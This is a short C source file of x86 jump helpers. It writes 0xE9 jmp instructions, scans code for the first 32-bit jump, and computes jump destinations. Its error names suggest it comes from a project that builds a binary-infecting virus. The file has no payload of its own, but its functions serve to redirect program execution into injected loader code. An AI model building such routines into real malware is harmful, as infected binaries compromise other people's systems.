#include <stdint.h>
#include <stdbool.h>
#include "disasm.h"
#include "compiler_utils.h"
#include "errors.h"
#include "jumps.h"

void	write_jump_arg(void *arg, int32_t value, uint8_t value_size)
{
	if (value_size == DWORD)     *(int32_t*)arg = (int32_t)(value);
	else if (value_size == WORD) *(int16_t*)arg = (int16_t)(value);
	else if (value_size == BYTE) *(int8_t*)arg  = (int8_t)(value);
}

void	write_jump(void *buffer, int32_t value, uint8_t value_size)
{
	uint8_t	*opcode = (uint8_t*)(buffer);
	int32_t	*arg    = (int32_t*)(buffer + 1);

	*opcode = 0xe9; // rel16/32
	write_jump_arg(arg, value, value_size);
}

bool	is_jump32(const uint8_t *code)
{
	return (*code == 0xe9);
}

void	*find_first_jump(struct safe_ptr ref, size_t offset)
{
	void	*code  = safe(ref, offset, INSTRUCTION_MAXLEN);

	while (true)
	{
		if (code == NULL)
			return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);

		if (!known_instruction(code, INSTRUCTION_MAXLEN))
			return errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP);

		size_t	instruction_length = disasm_length(code, INSTRUCTION_MAXLEN);
		if (instruction_length == 0)
			return errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP);

		if (is_jump32(code))
			return code;

		code = step_instruction(ref, code, instruction_length);
	}
}

void	*get_jump_destination(void *jump_ptr)
{
	int32_t	*jump_value = (int32_t*)(jump_ptr + 1);

	return ((jump_ptr + JUMP32_INST_SIZE) + *jump_value);
}
